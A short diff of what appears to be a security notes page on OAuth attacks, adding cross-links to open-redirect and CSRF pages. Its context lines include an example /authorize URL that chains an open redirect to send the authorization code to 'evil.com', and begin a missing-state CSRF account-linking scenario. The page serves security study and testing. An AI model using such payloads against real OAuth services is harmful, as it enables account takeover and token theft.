@@ -38,7 +38,7 @@
 
 ## Common Attack Scenarios
 
-### Stealing Authorization Code via Open Redirect
+### Stealing Authorization Code via [Open Redirect](open-redirects.md)
 
 If you find an open redirect on the allowed domain, chain it:
 
@@ -46,7 +46,7 @@ If you find an open redirect on the allowed domain, chain it:
 /authorize?client_id=X&redirect_uri=https://allowed.com/redirect?url=https://evil.com&response_type=code
 ```
 
-### Missing State Parameter (CSRF)
+### Missing State Parameter ([CSRF](csrf.md))
 
 Force a victim to link their account with the attacker's OAuth account:
 
